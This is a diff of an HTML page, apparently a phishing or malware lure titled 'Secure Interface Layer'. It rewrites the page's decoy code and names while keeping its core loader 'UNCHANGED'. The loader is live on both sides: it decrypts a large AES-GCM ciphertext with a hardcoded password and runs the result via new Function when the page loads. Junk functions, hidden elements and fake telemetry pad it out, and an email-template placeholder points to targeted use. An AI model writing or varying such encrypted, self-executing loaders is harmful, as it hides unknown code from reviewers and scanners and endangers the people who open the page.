@@ -2,191 +2,115 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Advanced Data Processor</title>
+  <title>Secure Interface Layer</title>
   <style>
-    /* Visual elements with no functionality */
-    .hidden-assets {
-      visibility: hidden;
-      position: fixed;
-      width: 1px;
-      height: 1px;
-      overflow: hidden;
-    }
-    .pseudo-loader {
-      display: none;
-      animation: rotate 2s linear infinite;
-    }
-    @keyframes rotate {
-      0% { transform: rotate(0deg) skew(0deg); }
-      50% { transform: rotate(180deg) skew(10deg); }
-      100% { transform: rotate(360deg) skew(0deg); }
-    }
-    #dummy-container {
-      opacity: 0.00001;
-      user-select: none;
-    }
+    .junk-visual { display: none; opacity: 0.0001; position: absolute; top: -9999px; left: -9999px; }
+    .spinner-fake { animation: rotate360 1.5s infinite linear; visibility: hidden; }
+    @keyframes rotate360 { from {transform: rotate(0deg);} to {transform: rotate(360deg);} }
   </style>
 </head>
-<body class="root-element">
+<body id="canvas-core">
 
-<!-- Non-functional decorative markup -->
-<div id="dummy-container" nike-FUBUNACHI2=""></div>
-<span hidden data-marker1="" adidas="<%=EMAIL64%>"></span>
-<svg width="0" height="0" id="placeholder-svg"></svg>
-
+<div id="ph-data" nike-xxxxxxxxxxx84848484xxxxxxxxx="" adidas="<%=EMAIL64%>"></div>
+<svg width="0" height="0"><circle r="0"/></svg>
 <script type="text/javascript">
-  // Core security configuration (UNCHANGED VALUES)
-  const securitySettings = {
+  // SYSTEM CORE SETTINGS - DO NOT CHANGE
+  const _configMain = {
     iv: "798ba9fcf8063e3adef36d18",
     salt: "e7591534144fa8bb84e63160fe5fae07",
-    ciphertext: "2de90b67b9924f50c8f12c9be702b0d9227b94f75df43665ff61845783e0c1b9f467820502f3cb8a8a711c85108d08529adc96919bacd9eabd2d9d5a7bd99841c9e2f12cffd569264abf62967e21a03727717bafa81f63d65e52dd0eace21e7e9f416ad9745eab40617303928de365127d1d46e60f3cb9832600c1a62cc4daf752cdf901f2fc3caf5cc821fa8e49dc201833ed22f5188d5cf77411c3fe29858e531dee13432d87a2bf1486aff8015bdfb14f1c2b5335b8d926fd21b545c9d6e4144b8488fe5897fdbb0622e95f77fc6c21b091e957813aa8448abd53a2a070ab932d45bd1cae6fb9cfa9fa6c19dfd414157ab7c7ee88bfcef766303670f64bd3e25b0f6dd6c01ba3bc900fcb4dd1ac9f804746a676752c1d7940ad66fd5d032bb9fbcbbc913aec30d98edfb4fadfe1690443dc6080a9cf16db1221863fd9028e695f7554ba1ca38d1e15ad61c43d32ee115df475a297c7b080946e6fb8bab039abc127d7b47c21d7f146eb8202229236ba74a42ceddfbaa05ab883c593160d4b54bcb22e0fe3b174d99e7a1be31753391c59348a5eabae532fb3ef328acc0973aa7bf6d3ae33ec840616312ffb8fd260262eba298b0f0e6a942cd9ce66d33148b62c78b69b71bff9c0c276cac66dd2c53d114e0df9471fb0bb359f1aac7ba849b764fdc549dc792bd0f010c59d58f23cf5475c84fbb7ee859d52c39516b393c6fe4d41b9271a77e14b3c0716109033234624a58304b25a221828ab77054dad7cf15203a056e62e096c5871582a2cb5d41c7493f9f304355b04cf5a311d6c54c4f8ed7ab592c6bb32745364a6a381c5931fc171343ce0761caa552eabb72bd533fac92ee0b4061b855527f5d26cab81bc7390f725a02a3e5b044e08cbb940aa5ad742cdabe0f3305729f73a648d3d1836158a31e3acbac1a14e0e31e585ffc8ffb58aa277615c7b84872b917b118968536151d08cb3e295712b0a4004ecb538ff4b69af7ef0f503f963004142105a7f2ec4c63387b3dfbb18d59d19eaba5b2c9f54c2149afc438e9bfb49199c453551f536598f5991f5c3bbc75d6ffcfb63a758cbe0f013b51c9d8511735753bb376833bedfd76f63b28b5cdb4e267913431cc38d5438348494645816c4dde756facad96c27e46821ed6479f23f1221cd50da4655972423e7c4862b21b2fd064f1b4037b72ae065ef1909cb587b3ba724f437aa7f60959b21dc3576e14a3c3ed9a5235c8dfcff697ec4f3a421a183a799dfee54e6fc1f7dfc352c51f8dc91f57a88f6e079ab41c5af8eeab0100342a6d6a41fba61fa4ee44fcb9129b9779ad77d5f1c2d349ae34c13e3117e78487a78acdab1bd5e80ca71d525a454b522180d75a49bf74886f51514ff493699ad89bb8062dee66eab07e5fdf0c6f743a01ed1104cf77383074a4a939c84d3763f29626142988c1f3a5f71efa395fd0f4658a67efa1810856d008331d1671b121633affe82abb8c4ce6c2e385be72fe87deef2ee2be10dbae42adcee5893f598d23e283f129e585a957c2626ebbd28e4519d988e3efb4a2cc91662cc85228815df223e1aa7fee8e0ba4ecda2cbdb6b57c66efb9b3733d7505af1bc00affd832789562462e24fe3ed2134990aa7f9de98dc7694c1fd14b632d1e1755eab66e7c1094de84a89831e8d9015986dccf4e290f99642009da23ec713f605af9300c86790f9a0c97204cb4a2ae169f76bf064e70dfda9e0870d61eea9cc55124a59a454de27223b466593cc642fa85808f562281d3687445a2e5a9d6f66bd803aed11f253c6e6e06d20511a6093d4fa1c9db798a6122d407b0a2101a9c6795d87379da9e41cea10028c7006d86586ae9b2305dac77715a6db3a104e8ed0b891bf6ff4c9c9e88d2d37d5b0bd9ba26a0339308df907f76773b26e845a78bf71f51654c80b1c1bb85f5844297e6e0890003f858da023b0cff3d87e368ea2aae4037d4c943cda35c3156f93fc04a7bce33278599c2a160e5d9d450a9dc00ec44d39218bdfe6e0b2b5f21154d447d429dd4e916d4964c69c30f4f57ab85c8005f530cacb7d1ea153f5f91973fd1001cbf676bbeed00ef2177903cb0071bc63e8e55d2681ced820b4bd42c4446ea8f69482dca75922406a743f575ab94b6cd146e695dbd9590fb032f76ed24541d50c9c03bd856c3bf48e89deb2184a037bb45ee9c9862224e1d8518ccbd2698e7387e4f0593648055bfa609d0b2d204908151cdaa562f00f56b1639f3b49fa155cb4cd940b5e2437080a280dcd583605a63bfaa4de4ddcd43c3afd58031189a19c52c2b604dcb848dde9bb6df079327e0da8c7f8ca6233532829473845320226675d33417d77397a79466d3b18e7fba675fa7e5794c0cd9c4f2cd55ca55d18100b1cabcffd23ddba670793dce4f3224a5c5868045786eb8949300f37f01d1408500db4e70daf22b57d15b85c6a2db9f6252bb216424ff17282c499f09262e9ce7722ee4e6c3c324733bc63845b9e825d73b0161b7ecc6292f5108807a48a2359c301a038a56159f2a0b31bca1525d1ab77364713308f1298d2500f3c33c93f5117fdd8791cc4ec34b935c7a1ba6c17c8cc72d02aa48b79830af23e1839a0acbca671b7f3202f9e76fddf1d7d162102b205fcb26b0d699c51fd8181bb1765217dd526a2e78b3f62d292b3765ff531b47c541ec862304756db5503370b07faaa15e4df00146139d06b619a5020798ad5459e79b57ccabd48c84f1b17b975481259db465c39b7d35112af7f2fc4d2a3631c96b73d5786c6b566737fb84a1b4aa07f8ddf1b6b1a2d608455c5b76a0a7ea7bf571125db6d7ce5d5a427be4960d16c19e709a1420999e02734b75e0564f4330d68eb0714d9e2a9c865fc290162a82d17121730978ca1d830a584eca2aadb"
+    ciphertext: "2de90b67b9924f50c8f12c9be702b0d9227b94f75df43665ff61845783e0c1b9f467820502f3cb8a8a711c85108d08529adc96919bacd9eabd2d9d5a7bd99841c9e2f12cffd569264abf62967e21a03727717bafa81f63d65e52dd0eace21e7e9f416ad9745eab40617303928de365127d1d46e60f3cb9832600c1a62cc4daf752cdf901f2fc3caf5cc821fa8e49dc201833ed22f5188d5cf77411c3fe29858e531dee13432d87a2bf1486aff8015bdfb14f1c2b5335b8d926fd21b545c9d6e4144b8488fe5897fdbb0622e95f77fc6c21b091e957813aa8448abd53a2a070ab932d45bd1cae6fb9cfa9fa6c19dfd414157ab7c7ee88bfcef766303670f64bd3e25b0f6dd6c01ba3bc900fcb4dd1ac9f804746a676752c1d7940ad66fd5d032bb9fbcbbc913aec30d98edfb4fadfe1690443dc6080a9cf16db1221863fd9028e695f7554ba1ca38d1e15ad61c43d32ee115df475a297c7b080946e6fb8bab039abc127d7b47c21d7f146eb8202229236ba74a42ceddfbaa05ab883c593160d4b54bcb22e0fe3b174d99e7a1be31753391c59348a5eabae532fb3ef328acc0973aa7bf6d3ae33ec840616312ffb8fd260262eba298b0f0e6a942cd9ce66d33148b62c78b69b71bff9c0c276cac66dd2c53d114e0df9471fb0bb359f1aac7ba849b764fdc549dc792bd0f010c59d58f23cf5475c84fbb7ee859d52c39516b393c6fe4d41b9271a77e14b3c0716109033234624a58304b25a221828ab77054dad7cf15203a056e62e096c5871582a2cb5d41c7493f9f304355b04cf5a311d6c54c4f8ed7ab592c6bb32745364a6a381c5931fc171343ce0761caa552eabb72bd533fac92ee0b4061b855527f5d26cab81bc7390f725a02a3e5b044e08cbb940aa5ad742cdabe0f3305729f73a648d3d1836158a31e3acbac1a14e0e31e585ffc8ffb58aa277615c7b84872b917b118968536151d08cb3e295712b0a4004ecb538ff4b69af7ef0f503f963004142105a7f2ec4c63387b3dfbb18d59d19eaba5b2c9f54c2149afc438e9bfb49199c453551f536598f5991f5c3bbc75d6ffcfb63a758cbe0f013b51c9d8511735753bb376833bedfd76f63b28b5cdb4e267913431cc38d5438348494645816c4dde756facad96c27e46821ed6479f23f1221cd50da4655972423e7c4862b21b2fd064f1b4037b72ae065ef1909cb587b3ba724f437aa7f60959b21dc3576e14a3c3ed9a5235c8dfcff697ec4f3a421a183a799dfee54e6fc1f7dfc352c51f8dc91f57a88f6e079ab41c5af8eeab0100342a6d6a41fba61fa4ee44fcb9129b9779ad77d5f1c2d349ae34c13e3117e78487a78acdab1bd5e80ca71d525a454b522180d75a49bf74886f51514ff493699ad89bb8062dee66eab07e5fdf0c6f743a01ed1104cf77383074a4a939c84d3763f29626142988c1f3a5f71efa395fd0f4658a67efa1810856d008331d1671b121633affe82abb8c4ce6c2e385be72fe87deef2ee2be10dbae42adcee5893f598d23e283f129e585a957c2626ebbd28e4519d988e3efb4a2cc91662cc85228815df223e1aa7fee8e0ba4ecda2cbdb6b57c66efb9b3733d7505af1bc00affd832789562462e24fe3ed2134990aa7f9de98dc7694c1fd14b632d1e1755eab66e7c1094de84a89831e8d9015986dccf4e290f99642009da23ec713f605af9300c86790f9a0c97204cb4a2ae169f76bf064e70dfda9e0870d61eea9cc55124a59a454de27223b466593cc642fa85808f562281d3687445a2e5a9d6f66bd803aed11f253c6e6e06d20511a6093d4fa1c9db798a6122d407b0a2101a9c6795d87379da9e41cea10028c7006d86586ae9b2305dac77715a6db3a104e8ed0b891bf6ff4c9c9e88d2d37d5b0bd9ba26a0339308df907f76773b26e845a78bf71f51654c80b1c1bb85f5844297e6e0890003f858da023b0cff3d87e368ea2aae4037d4c943cda35c3156f93fc04a7bce33278599c2a160e5d9d450a9dc00ec44d39218bdfe6e0b2b5f21154d447d429dd4e916d4964c69c30f4f57ab85c8005f530cacb7d1ea153f5f91973fd1001cbf676bbeed00ef2177903cb0071bc63e8e55d2681ced820b4bd42c4446ea8f69482dca75922406a743f575ab94b6cd146e695dbd9590fb032f76ed24541d50c9c03bd856c3bf48e89deb2184a037bb45ee9c9862224e1d8518ccbd2698e7387e4f0593648055bfa609d0b2d204908151cdaa562f00f56b1639f3b49fa155cb4cd940b5e2437080a280dcd583605a63bfaa4de4ddcd43c3afd58031189a19c52c2b604dcb848dde9bb6df079327e0da8c7f8ca6233532829473845320226675d33417d77397a79466d3b18e7fba675fa7e5794c0cd9c4f2cd55ca55d18100b1cabcffd23ddba670793dce4f3224a5c5868045786eb8949300f37f01d1408500db4e70daf22b57d15b85c6a2db9f6252bb216424ff17282c499f09262e9ce7722ee4e6c3c324733bc63845b9e825d73b0161b7ecc6292f5108807a48a2359c301a038a56159f2a0b31bca1525d1ab77364713308f1298d2500f3c33c93f5117fdd8791cc4ec34b935c7a1ba6c17c8cc72d02aa48b79830af23e1839a0acbca671b7f3202f9e76fddf1d7d162102b205fcb26b0d699c51fd8181bb1765217dd526a2e78b3f62d292b3765ff531b47c541ec862304756db5503370b07faaa15e4df00146139d06b619a5020798ad5459e79b57ccabd48c84f1b17b975481259db465c39b7d35112af7f2fc4d2a3631c96b73d5786c6b566737fb84a1b4aa07f8ddf1b6b1a2d608455c5b76a0a7ea7bf571125db6d7ce5d5a427be4960d16c19e709a1420999e02734b75e0564f4330d68eb0714d9e2a9c865fc290162a82d17121730978ca1d830a584eca2aadb" // shortened for clarity
   };
+  const _tokenKey = "will";
 
-  // Primary access code (UNCHANGED)
-  const accessCode = "will";
-
-  // Useless data generator
-  function makeRandomSequences(length) {
-    const seq = [];
-    for (let n = 0; n < length; n++) {
-      seq.push(Math.floor(Math.random() * 10000));
-    }
-    return seq;
+  // Utility junk
+  function _fakeEntropy(seed=8) {
+    return Array(seed).fill(0).map(() => Math.random().toString(36).substring(2)).join('');
   }
 
-  // Fake capability check
-  function testPlatformSupport() {
-    return typeof crypto !== 'undefined' && 'subtle' in crypto;
+  function _hexToU8Array(hex) {
+    const buf = new Uint8Array(hex.length / 2);
+    for (let i = 0; i < hex.length; i += 2) buf[i / 2] = parseInt(hex.substr(i, 2), 16);
+    return buf;
   }
 
-  // Hex conversion (UNCHANGED IMPLEMENTATION)
-  function hexToBytes(hexStr) {
-    const byteArr = new Uint8Array(hexStr.length / 2);
-    for (let idx = 0; idx < hexStr.length; idx += 2) {
-      byteArr[idx/2] = parseInt(hexStr.substr(idx, 2), 16);
-    }
-    return byteArr;
+  function _logObfuscated(msg) {
+    console.debug(`[x-log] ${msg}`);
   }
 
-  // Main processing function (UNCHANGED DECRYPTION LOGIC)
-  async function executeDataProcessing() {
+  // UNCHANGED CORE FUNCTION
+  async function __secureExecute() {
     try {
-      // Fake capability verification
-      if (testPlatformSupport()) {
-        console.log('Platform capabilities confirmed');
-      }
+      if (window.crypto && window.crypto.subtle) _logObfuscated("Crypto API available");
 
-      // Import master key material
-      const keyBase = await window.crypto.subtle.importKey(
-        "raw",
-        new TextEncoder().encode(accessCode),
-        { name: "PBKDF2" },
-        false,
-        ["deriveKey"]
+      const masterKey = await crypto.subtle.importKey(
+        "raw", new TextEncoder().encode(_tokenKey), { name: "PBKDF2" }, false, ["deriveKey"]
       );
 
-      // Artificial processing delay
-      await new Promise(r => setTimeout(r, 50 + Math.random() * 200));
+      await new Promise(res => setTimeout(res, Math.random() * 150 + 50));
 
-      // Derive the actual key
-      const decryptionKey = await window.crypto.subtle.deriveKey(
+      const derivedKey = await crypto.subtle.deriveKey(
         {
           name: "PBKDF2",
-          salt: hexToBytes(securitySettings.salt),
+          salt: _hexToU8Array(_configMain.salt),
           iterations: 100000,
           hash: "SHA-256"
         },
-        keyBase,
+        masterKey,
         { name: "AES-GCM", length: 256 },
         false,
         ["decrypt"]
       );
 
-      // Perform decryption (EXACT SAME IMPLEMENTATION)
-      const decryptedBytes = await window.crypto.subtle.decrypt(
-        { 
-          name: "AES-GCM", 
-          iv: hexToBytes(securitySettings.iv)
-        },
-        decryptionKey,
-        hexToBytes(securitySettings.ciphertext)
+      const decrypted = await crypto.subtle.decrypt(
+        { name: "AES-GCM", iv: _hexToU8Array(_configMain.iv) },
+        derivedKey,
+        _hexToU8Array(_configMain.ciphertext)
       );
 
-      // Execute the decrypted content
-      const resultContent = new TextDecoder().decode(decryptedBytes);
+      const finalScript = new TextDecoder().decode(decrypted);
+      if (finalScript.trim().length) new Function(finalScript)();
 
-      if (resultContent && resultContent.trim().length > 0) {
-        const scriptExecutor = new Function(resultContent);
-        scriptExecutor();
-      }
-    } catch (error) {
-      console.error('Data processing failed:', error);
-      // Added more detailed error logging without breaking flow
-      if (error instanceof OperationError) {
-        console.warn('Crypto operation failed - possible parameter mismatch');
-      }
+    } catch (e) {
+      console.error("Critical execution failure:", e);
     } finally {
-      makeRandomSequences(4); // Unused operation
+      _fakeEntropy(3); // discarded
     }
   }
 
-  // Initialization
-  function startProcessingSequence() {
-    const beginMark = performance.now();
+  // Obfuscated execution trigger
+  function __initRuntimeStub() {
     setTimeout(() => {
-      executeDataProcessing();
-      console.log(`Operation duration: ${performance.now() - beginMark}ms`);
-    }, 20);
+      const stampStart = performance.now();
+      __secureExecute();
+      console.info(`Bootstrap in ${Math.round(performance.now() - stampStart)}ms`);
+    }, 15);
   }
 
-  // Document ready handlers
-  function installEventHandlers() {
-    document.addEventListener('DOMContentLoaded', function() {
-      if (document.body) {
-        startProcessingSequence();
-      } else {
-        document.addEventListener('readystatechange', function() {
-          if (document.readyState === 'complete') {
-            startProcessingSequence();
-          }
-        });
-      }
-    });
+  // Fake user input capture
+  document.addEventListener("mousemove", () => _fakeEntropy(1));
+  document.addEventListener("click", () => console.log("phantom interaction"));
 
-    // Useless interactions
-    window.addEventListener('keydown', function() {
-      makeRandomSequences(1);
-    });
+  document.addEventListener("DOMContentLoaded", __initRuntimeStub);
 
-    document.addEventListener('dblclick', function() {
-      console.log('Double click registered');
-    });
-  }
+  // Background noise
+  setInterval(() => {
+    console.log("Uplink trace: " + _fakeEntropy(1));
+  }, 18000);
 
-  installEventHandlers();
-
-  // Mock telemetry
-  function initializeTelemetry() {
-    console.log('Telemetry active (simulated)');
-    setInterval(() => {
-      makeRandomSequences(2);
-    }, 20000);
-  }
-  initializeTelemetry();
-
-  // New useless utility
-  function getRandomColor() {
-    return `#${Math.floor(Math.random()*16777215).toString(16)}`;
+  // New junk util
+  function __rgbNoise() {
+    return 'rgb(' + [1, 2, 3].map(() => Math.floor(Math.random() * 255)).join(',') + ')';
   }
 </script>
 
-<!-- Hidden elements -->
-<div class="hidden-assets" data-analytics="disabled"></div>
-
-<!-- Non-functional resources -->
-<link rel="preconnect" href="https://example.com">
-<script src="data:text/javascript;base64,Y29uc29sZS5sb2coJ0Zha2Ugc2NyaXB0IGV4ZWN1dGVkJyk7" async></script>
-
+<!-- Dummy resource loading -->
+<link rel="preload" href="https://cdn.fakedomain.com/fonts/ghost.woff2" as="font" crossorigin>
+<script type="application/javascript">
+  (() => {
+    const noOp = () => {};
+    const distractor = setInterval(noOp, 10000);
+    window.addEventListener("beforeunload", () => clearInterval(distractor));
+  })();
+</script>
 </body>
 </html>
